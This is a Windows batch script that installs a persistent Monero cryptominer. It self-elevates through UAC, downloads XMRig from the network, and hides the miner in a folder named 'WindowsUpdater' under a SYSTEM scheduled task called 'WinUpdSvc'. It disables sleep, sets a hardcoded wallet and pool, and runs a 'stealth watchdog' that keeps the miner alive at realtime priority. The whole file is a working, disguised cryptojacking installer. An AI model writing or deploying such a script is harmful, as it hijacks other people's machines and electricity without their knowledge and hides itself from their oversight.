@echo off
REM ====================================================================
REM Bulletproof Monero Miner - One-Time Admin Setup
REM ====================================================================
setlocal enableextensions enabledelayedexpansion

REM === CONFIGURATION ===
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=WinUpdSvc"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "POOL=gulf.moneroocean.stream:10128"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

REM === One-Time Admin Enforcement ===
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)

echo ===============================
echo Starting Permanent Admin Miner
echo ===============================

REM === System Optimization ===
powercfg /change standby-timeout-ac 0 >nul
powercfg /change standby-timeout-dc 0 >nul
powercfg /hibernate off >nul
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESS IDLE_DISABLE 000 >nul
powercfg /setactive SCHEME_CURRENT >nul

REM === CPU Core Detection ===
set "AFFINITY_MASK="
for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do (
    set /a "CORES=%%A-1"
    for /l %%B in (0,1,!CORES!) do set "AFFINITY_MASK=!AFFINITY_MASK!1"
)

REM === Auto-Update Miner ===
echo [*] Checking for XMRig updates...
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"

if defined URL (
    echo [+] Downloading update...
    powershell -Command "try{IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop}catch{exit 1}" && (
        if not exist "%SRC%" mkdir "%SRC%"
        powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force"
        del "%TEMP%\xmrig.zip"
    )
)

REM === Install Files ===
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul || (
    echo [!] File copy failed
    pause
    exit /b 1
)

REM === Generate Config File ===
(
  echo {
  echo   "autosave": true,
  echo   "cpu": {
  echo     "enabled": true,
  echo     "huge-pages": true,
  echo     "hw-aes": true,
  echo     "priority": 0,
  echo     "memory-pool": true,
  echo     "asm": true,
  echo     "max-threads-hint": 100,
  echo     "affinity": !AFFINITY_MASK!
  echo   },
  echo   "opencl": false,
  echo   "cuda": false,
  echo   "pools": [
  echo     {
  echo       "url": "%POOL%",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false
  echo     }
  echo   ]
  echo }
) > "%DEST%\config.json"

REM === Permanent Auto-Start ===
schtasks /create /tn "%TASK_NAME%" ^
  /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
  /sc onstart ^
  /ru SYSTEM ^
  /rl HIGHEST ^
  /f >nul 2>&1 || (
    echo [!] Failed to create scheduled task
    pause
    exit /b 1
)

REM === Stealth Watchdog ===
(
  echo @echo off
  echo :loop
  echo start "" /realtime /b "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%"
  echo timeout /t 10 >nul
  echo tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /i "xmrig.exe" >nul ^|^| goto loop
  echo goto loop
) > "%DEST%\run_watchdog.bat"

start "" /min "%DEST%\run_watchdog.bat"

echo [✔] Miner installed permanently with SYSTEM privileges
echo CPU Affinity: !AFFINITY_MASK!
echo Logs: %LOG_FILE%
echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
pause